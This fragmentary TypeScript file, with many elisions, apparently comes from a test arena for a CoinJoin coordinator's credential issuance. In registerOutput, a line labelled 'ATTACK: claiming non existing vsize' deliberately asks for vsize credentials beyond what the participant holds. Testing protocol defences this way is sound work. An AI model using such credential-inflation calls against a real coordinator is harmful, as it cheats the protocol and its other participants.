...
import { Arena, Round, Alice, AlicePhase, Credentials, IssuanceData } from '../types';
...
const joinInputsCredentials = async (arena: Arena) => {
    ...
    let vsizeCredentials = inputs[0].confirmedAmountCredentials;
    for (let i = 1; i < inputs.length; i++) {
        ...
        const realVsizeCredentials = await middleware.getZeroCredentials(
            round.vsizeCredentialIssuerParameters,
        );
...
const registerOutput = async (
    ...
    const issuanceVsizeCredentials = await middleware.getRealCredentials(
        [255, _availableVsize - 255], // ATTACK: claiming non existing vsize
        vsizeCredentials,
        round.vsizeCredentialIssuerParameters,
        round.maxVsizeCredentialValue,
    );
    ...
    const outputVsizeCredentials = await middleware.getRealCredentials(
        // [vsizeCredentialsOut[0].value - inputs[0].outputSize],
        [vsizeCredentialsOut[0].value - 31],
    ...
    return {
        availableAmount: availableAmount - outputAmount,
...
export const outputRegistration = async (arena: Arena): Promise<Arena> => {
    ...
    // const joinedIssuance = await sumInputs(arena); // coordinator.credentialIssuance(inputs[0], a, s);
    ...
    // const outputAmounts = [258280326, 40786134];
    // const outputAmounts = [86093441, 86093442, 86093443, 40786134 + 11997];
    // const outputAmounts = [86093442, 86093442, 86093442, 40786134];
    // const outputAmounts = [299078457];
    // const outputAmounts = [availableAmount / 2, availableAmount / 2];
    ...
    // const rr = await registerOutput(
    //     round,
    //     inputs[0].outputAddresses[0],
    //     299078457,
    //     availableAmount,
    //     availableVsize,
    //     amountCredentials,
